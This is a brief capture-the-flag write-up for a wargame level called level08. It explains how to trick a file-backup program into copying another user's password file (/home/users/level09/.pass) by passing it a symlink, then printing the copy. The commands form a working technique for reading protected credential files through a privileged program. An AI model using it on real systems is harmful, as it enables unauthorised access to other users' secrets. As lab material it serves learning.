level08 takes one argument.
reads it and tries to save it in ~/backups
in backups/.log , it says what it did when it succeeds.

we can't simply do ./level08 /home/users/level09/.pass
because it concatenates ./backups to av[1] and ./backups//home/users/level09/.pass doesn't exist

we can simply do a symlink
ln -s /home/users/level09/.pass pass
./level08 pass
cat .backups/pass
